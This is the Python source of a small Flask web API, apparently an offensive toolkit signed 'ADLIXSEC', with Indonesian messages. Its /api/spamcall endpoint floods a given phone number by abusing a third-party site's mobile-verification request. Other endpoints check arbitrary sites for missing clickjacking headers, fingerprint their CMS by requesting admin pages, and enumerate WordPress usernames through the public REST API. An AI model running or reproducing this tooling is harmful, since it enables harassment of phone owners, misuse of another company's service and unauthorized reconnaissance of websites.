from urllib.request import urlopen
from flask import *
from requests import get, post
import json

app = Flask(__name__)

@app.route("/")
def index():
    return "<center><h1>INI INDEX<h1></center>"

@app.route("/api")
def api():
    return "<center><h1>API BY ADLIXSEC {}<h1></center>"

@app.route("/api/spamcall", methods=['GET', 'POST'])
def spam_call():
    if request.args.get('no'):
        no = request.args.get('no')
        if str(no).startswith('8'):
            hasil = ''
            exec = post('https://id.jagreward.com/member/verify-mobile/'+no).json()
            if exec['result'] == 1:
                hasil = '[!] Spam Berhasil'
            else:
                hasil = '[!] Spam Gagal'
            return {
                'status': 200,
                'message': hasil
            }
        else:
            return {
                'status': False,
                'message': '[!] Tolong masukkan nomor awalan 8'
            }
    else:
        return {
            'status': False,
            'message': '[!] Tolong masukkan parameter no'
        }

@app.route("/api/cjtest", methods=['GET', 'POST'])
def cj_test():

    def check(url):

        try:
            if "http" not in url: 
                url = "http://" + url

            data = urlopen(url)
            headers = data.info()

            if not "X-Frame-Options" in headers: 
                return True, headers
        except: 
            return False

    if request.args.get('cj'):
        cj = request.args.get('cj')
        status = check(cj)
        if status:
            return {
                'status': 200,
                'message': 'Web '+cj+' Vuln Clickjacking'
            }
        elif not status: 
            return {
                'status': False,
                'message': 'Web '+cj+' Not Vuln Clickjacking'
            }
    else:
        return {
            'status': False,
            'message': '[!] Tolong masukkan parameter cj'
        }

@app.route("/api/cmsscan", methods=['GET', 'POST'])
def cmsscan():
    if request.args.get('c'):
        url = request.args.get('c')
        cmsop = get(url+'/admin',timeout=7)
        cmsjoomla = get(url + '/administrator/index.php',timeout=7)
        cmswp = get(url + '/wp-login.php',timeout=7)
        cmsdrupal = get(url + '/admin',timeout=7)
        if "dashboard" in cmsop.text:
            return {
                'status': 200,
                'message': 'CMS Found, CMS = OPenCarte'
            }
        elif "Joomla" in cmsjoomla.text:
            return {
                'status': 200,
                'message': 'CMS Found, CMS = Joomla'
            }
        elif "WordPress" in cmswp.text:
            return {
                'status': 200,
                'message': 'CMS Found, CMS = WordPress'
            }
        elif "sites/default" in cmsdrupal.text:
            return {
                'status': 200,
                'message': 'CMS Found, CMS = Drupal'
            }
        else:
            return {
                'status': False,
                'message': 'CMS Not Found, url = '+url
            }
    else:
        return {
            'status': False,
            'message': 'Masukkan parameter c'
        }

@app.route("/api/wpuser", methods=['GET', 'POST'])
def wpuser():
    if request.args.get("u"):
        target = request.args.get("u")
        print('\n')
        getu = get(f"{target}/wp-json/wp/v2/users")

        if getu.status_code == 200:
            ipdata = json.loads(getu.text)
            
            data = {
                'status': 200,
                'message': ipdata[0]['slug']
            }
            return data
    else:
        return {
            'status': 200,
            'message': 'Masukkan parameter u'
        }

if __name__ == "__main__":
    app.run()
